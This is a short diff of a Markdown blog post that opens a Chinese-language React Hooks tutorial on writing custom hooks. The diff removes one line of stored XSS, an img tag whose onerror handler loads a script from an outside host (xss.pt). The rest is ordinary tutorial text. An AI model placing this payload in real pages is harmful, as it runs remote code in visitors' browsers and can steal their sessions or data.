@@ -8,7 +8,7 @@ author: HyG
 
 * content
 {:toc}
-<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='https://xss.pt/P0I2';>
+
 掌握 React Hooks api 将更好的帮助你在工作中使用，对 React 的掌握更上一层楼。本系列将使用大量实例代码和效果展示，非常易于初学者和复习使用。
 
 截至目前，学习了官方的这么多 hooks api，我们也可以创造一些自己的 hooks，甚至官方也在鼓励开发者将组件逻辑抽象到自定义 hooks 中，方便复用。
